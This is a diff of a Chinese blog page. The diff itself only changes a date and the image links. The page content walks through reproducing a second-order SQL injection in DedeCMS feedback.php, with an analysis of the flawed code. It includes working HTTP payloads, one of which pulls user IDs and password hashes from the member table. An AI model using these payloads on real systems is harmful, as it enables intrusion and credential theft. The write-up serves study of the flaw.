@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-06-27
+                    2024-07-27
                 </div>
                 
 
@@ -471,7 +471,7 @@
             <div id="articleContent">
                 <h1 id="dedecms二次注入漏洞"><a href="#dedecms二次注入漏洞" class="headerlink" title="dedecms二次注入漏洞"></a>dedecms二次注入漏洞</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先搭建环境，注意php版本不要大于5.3，安装完后删除install文件夹</p>
 <p>进入主页是这样的</p>
-<p><img src="https://z3.ax1x.com/2021/11/30/o3T8r6.png" alt="o3T8r6.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/a72c0587bfe3f74f402b1314c92e3107.png"></p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>漏洞点在<code>\dedecms\plus\feedback.php</code></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//保存评论内容</span>
 	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$comtype</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'comments'</span><span class="token punctuation">)</span>
@@ -509,11 +509,11 @@
 <p><code>$arctitle = $row['arctitle'];</code></p>
 <p>这两句代码将id为fid的评论的读取出来，并将之前保存的标题赋值给arctitle，然后再将这个值插入数据库中，这时插入的值是没有经过addslashes转义的，这就导致了二次注入</p>
 <h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>先用管理员账号新增一个栏目用来发表文章dedecms/dede/</p>
-<p><img src="https://z3.ax1x.com/2021/11/30/o3TtaD.png" alt="o3TtaD.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/2ee04dc00404e80bc7030a47fd2728e5.png"></p>
 <p>注册一个普通用户用来做测试对象</p>
-<p><img src="https://z3.ax1x.com/2021/11/30/o3TgIg.png" alt="o3TgIg.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/39d4e1964304da5688416a73e8538e61.png"></p>
 <p>进入主页随便发布一篇文章</p>
-<p><img src="https://z3.ax1x.com/2021/11/30/o3TWGj.png" alt="o3TWGj.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/9280b647ce4c8b5b9d7da0dbf1bafd37.png"></p>
 <p>第一次注入</p>
 <p>根据代码构造payload</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">get  http:<span class="token comment">//dedecms/plus/feedback.php?aid=1</span>
@@ -522,10 +522,10 @@ post  <span class="token keyword">action</span><span class="token operator">=</s
 
 <p>aid为文章ID号，action为处理方式，comtype为操作方式，vaildate为验证码，也能注释掉方便测试，title未标题，构建payload的地方，其他参数审计得到</p>
 <p>注释验证码</p>
-<p><img src="https://z3.ax1x.com/2021/11/30/o37sp9.png" alt="o37sp9.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/146b7de895917c4e4086cd4707925e9a.png"></p>
 <p>执行注入就会发表一条评论，可以看到注入单引号被转义了</p>
-<p><img src="https://z3.ax1x.com/2021/11/30/o3TXW9.png" alt="o3TXW9.png"></p>
-<p><img src="https://z3.ax1x.com/2021/11/30/o37PoD.png" alt="o37PoD.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/219fb762991726610f47e58e92b613b8.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/b2b61c5c5cbcc9b89a5a1c42fbfb882c.png"></p>
 <p>第二次注入</p>
 <p>在第一条评论上注入</p>
 <p>fid为评论的ID号</p>
@@ -533,12 +533,12 @@ post  <span class="token keyword">action</span><span class="token operator">=</s
 
 post  <span class="token keyword">action</span><span class="token operator">=</span>send<span class="token operator">&amp;</span>comtype<span class="token operator">=</span>reply<span class="token operator">&amp;</span>fid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>isconfirm<span class="token operator">=</span>yes<span class="token operator">&amp;</span>validate<span class="token operator">=</span>xx<span class="token operator">&amp;</span>msg<span class="token operator">=</span><span class="token operator">*</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment">/**/</span>concat<span class="token punctuation">(</span>userid<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>xxxxx_member<span class="token comment">/**/</span><span class="token keyword">limit</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://z3.ax1x.com/2021/11/30/o37VSA.png" alt="o37VSA.png"></p>
-<p><img src="https://z3.ax1x.com/2021/11/30/o37Yyq.png" alt="o37Yyq.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/d554ba1d0411ed7e7d75dd7b518d86bc.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/838befebdd5c5dccd8ecdae24f1a6fb9.png"></p>
 <p>这里可以证实读取出来的acrtitle是没有转义的，再和msg拼接就造成了恶意sql代码的执行，并且把执行结果暴露出来了</p>
 <p>至此复现成功</p>
 <p>这里贴一下后台的数据库</p>
-<p><img src="https://z3.ax1x.com/2021/11/30/o37dTU.png" alt="o37dTU.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/e31b87f57662165e6b344e557bcabaec.png"></p>
 
                 
             </div>
